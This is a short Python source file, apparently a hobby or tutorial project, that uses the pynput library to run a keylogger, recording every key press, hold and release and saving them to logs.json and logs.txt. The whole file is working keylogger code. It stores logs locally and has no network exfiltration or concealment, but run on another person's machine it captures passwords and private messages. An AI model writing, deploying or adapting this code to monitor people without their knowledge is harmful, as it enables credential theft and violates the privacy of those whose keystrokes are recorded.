from pynput import keyboard
import json
import time

key_list = []
x = False
key_strokes = ""

def update_json_file(key_list):
    with open('logs.json', 'w') as key_log:  # use 'w' mode for text
        json.dump(key_list, key_log, indent=2)

def update_txt_file(key_list):
    with open('logs.txt', 'w') as txt_log:
        for event in key_list:
            for action, key in event.items():
                key_str = str(key).replace("'", "")
                if key_str.startswith('Key.'):
                    txt_log.write(f" {key_str}\n")
                else:
                    txt_log.write(f" '{key_str}'\n")

def on_press(key):
    global x, key_list
    try:
        key_str = str(key).replace("'", "")
    except:
        key_str = str(key)
        
    if x == False:
        key_list.append({'Pressed': key_str})
        x = True
    else:
        key_list.append({'Held': key_str})
    
    update_json_file(key_list)
    update_txt_file(key_list)

def on_release(key):
    global x, key_list
    try:
        key_str = str(key).replace("'", "")
    except:
        key_str = str(key)
        
    key_list.append({'Released': key_str})
    if x == True:
        x = False
    
    update_json_file(key_list)
    update_txt_file(key_list)

print("[+] Running Keylogger successfully!")
print("[+] Saving key logs in 'logs.json' (JSON) and 'logs.txt' (plain text)")
print("[+] Press Ctrl+C to stop\n")

try:
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    print("\n[+] Keylogger stopped by user")